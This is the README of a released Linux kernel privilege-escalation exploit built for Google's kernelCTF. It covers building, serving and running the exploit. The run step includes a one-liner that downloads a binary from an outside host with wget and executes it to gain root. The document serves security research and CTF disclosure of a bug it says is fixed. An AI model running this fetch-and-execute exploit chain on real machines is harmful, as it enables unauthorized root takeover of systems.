# OhClock

OhClock is a 0/1 day local privilege escalation exploit for the Linux LTS kernels, escalating from an unprivileged jailed shell to root via a POSIX CPU-timer use-after-free.

Built and tuned for Google kernelCTF latest instance (`lts-6.12.95`) on its two-vCPU Intel Xeon Platinum 8481C instance.

This vulnerability was spotted thanks to a recent post on X :)

Turning it into a universal LPE is left as an exercise for the reader ;)

Authors: Pietro Foroni (HWG Offensive Team) and Dan.

## Proof of concept

[![OhClock proof of concept](https://asciinema.org/a/y5K12hlmd4RL4t0M.svg)](https://asciinema.org/a/y5K12hlmd4RL4t0M)

## Build

```sh
make
```

Expose the binary to an endpoint reachable by the instance:

```sh
python3 -m http.server 8000
```

## Run

And now let's capture a flag on the Google's kernelCTF instance!!

Connect using the certificate published in the [kernelCTF rules](https://google.github.io/security-research/kernelctf/rules.html):

```sh
nano server_cert.pem
socat - ssl:kernelctf.vrp.ctfcompetition.com:1337,cafile=server_cert.pem
```

Select `lts-6.12.95`, then `run`, and inside the instance:

```sh
cd /tmp && wget -q http://yourhost:8000/exploit -O exploit && chmod +x exploit && CORE_WRITE_ATTEMPTS=3600 ./exploit
```

On success:

```sh
id
cat /flag
```

## Disclaimer

This project is published for security research and educational purposes only.
It targets a vulnerability that was fixed upstream (`920f893f735e`, 2026-07-05).
Use it only on systems you own or are explicitly authorized to test. The authors
accept no liability for any misuse or for any damage the exploit may cause.
